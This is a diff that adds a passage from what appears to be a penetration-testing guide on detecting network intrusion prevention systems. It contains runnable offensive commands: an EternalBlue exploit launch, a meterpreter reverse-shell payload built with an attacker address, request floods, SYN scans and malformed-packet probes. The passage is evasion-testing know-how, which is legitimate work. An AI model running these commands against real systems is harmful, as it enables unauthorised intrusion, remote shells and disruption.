@@ -1,0 +1,36 @@
+**Network IPS/IDS Detection**:
+- **Traffic Analysis**:
+  ```bash
+  # Send known attack patterns, observe response
+  # Metasploit modules
+  use auxiliary/scanner/ids/ips_fingerprint
+  
+  # Custom: Send exploit, check if connection reset
+  msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; run"
+  # If connection reset immediately = IPS
+  ```
+- **Signature-Based Detection Testing**:
+  ```bash
+  # Send known malicious payloads
+  # EICAR test file (AV)
+  echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt
+  curl -F "file=@eicar.txt" https://target.com/upload
+  
+  # Metasploit payloads
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe > payload.exe
+  # Upload, observe if blocked
+  ```
+- **Anomaly-Based Detection Testing**:
+  ```bash
+  # High volume, unusual patterns
+  for i in {1..1000}; do curl -s https://target.com/ > /dev/null; done
+  # Port scan detection
+  nmap -sS -T4 target.com
+  # If blocked after N connections = anomaly detection
+  ```
+- **Protocol Analysis**:
+  ```bash
+  # Malformed packets
+  hping3 --frag -p 80 target.com
+  hping3 --tcp-timestamp -p 80 target.com
+  # If dropped = IPS i
